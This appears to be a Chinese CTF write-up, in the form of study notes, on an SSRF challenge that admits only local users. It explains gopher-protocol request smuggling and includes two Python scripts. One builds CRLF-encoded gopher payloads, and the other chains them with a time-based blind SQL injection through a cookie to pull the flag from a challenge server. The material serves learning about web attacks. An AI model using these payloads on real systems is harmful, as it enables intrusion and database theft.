主页没有回显，只有一句话：

**you are not an inner user, so we can not let you have identify~**.意思是需要以本地用户访问。这里又没有rce、越权、文件包含等。那么很有可能有ssrf。

gopher协议和ssrf联合使用

> gopher协议是一种信息查找系统，他将Internet上的文件组织成某种索引，方便用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。利用此协议可以攻击内网的 Redis、Mysql、FastCGI、Ftp等等，也可以发送 GET、POST 请求。这拓宽了 SSRF 的攻击面

利用:
攻击内网的 Redis、Mysql、FastCGI、Ftp等等，也可以发送 GET、POST 请求
发送GET请求和POST请求
我们现在最多看到使用这个协议的时候都是在去ssrf打redis shell、读mysql数据的时候

- **gopher协议的格式：gopher://IP:port/_TCP/IP数据流**
- GET请求:
  构造HTTP数据包,URL编码、替换回车换行为%0d%0a，HTTP包最后加%0d%0a代表消息结束
- POST请求
  POST与GET传参的区别：它有4个参数为必要参数
  需要传递Content-Type,Content-Length,host,post的参数
  Content-Length和POST的参数长度必须一致

先用一个脚本试试

```python
import urllib.parse

host = "127.0.0.1:80"
content = "uname=admin&passwd=admin"
content_length = len(content)

payload =\
"""POST /index.php HTTP/1.1
Host: {}
User-Agent: curl/7.43.0
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: {}

{}
""".format(host,content_length,content)

tmp = urllib.parse.quote(payload) #对payload中的特殊字符进行编码
new = tmp.replace('%0A','%0D%0A') #CRLF(换行)漏洞
result = 'gopher://127.0.0.1:80/'+'_'+new
result = urllib.parse.quote(result)# 对新增的部分继续编码
print(result)

```

然后可以用cookie注入

```python
import urllib.parse
import requests
import time
import base64

host = "127.0.0.1:80"
content = "uname=admin&passwd=admin"
content_length = len(content)

payload =\
"""GET /index.php HTTP/1.1
Host: localhost:80
Connection: close
Content-Type: application/x-www-form-urlencoded
Cookie: this_is_your_cookie"""

tmp = urllib.parse.quote(payload) #对payload中的特殊字符进行编码
new = tmp.replace('%0A','%0D%0A') #CRLF(换行)漏洞
result = 'gopher://127.0.0.1:80/'+'_'+new+"="
result = urllib.parse.quote(result)# 对新增的部分继续编码
print(result)

url="http://61.147.171.105:60622/use.php?url="
flag=""
for pos in range(1,50):
    for i in range(33,127):
        #poc="') union select 1,2,if(1=1,sleep(5),1) # "

        #security
        #poc="') union select 1,2,if(ascii( substr((database()),"+str(pos)+",1) )="+str(i)+",sleep(2),1) # "

        #flag
        #poc="') union select 1,2,if(ascii( substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),"+str(pos)+",1) )="+str(i)+",sleep(2),1) # "
        
        poc="') union select 1,2,if(ascii( substr((select * from flag),"+str(pos)+",1) )="+str(i)+",sleep(2),1) # "
        
        bs = str(base64.b64encode(poc.encode("utf-8")), "utf-8")
        final_poc=result+bs+"%3B%250d%250a"
        t1=time.time()
        res=requests.get(url+final_poc)
        t2=time.time()
        if(t2-t1>2):
            flag+=chr(i)
            print(flag)
            break
print(flag)
```

太难了感觉不会

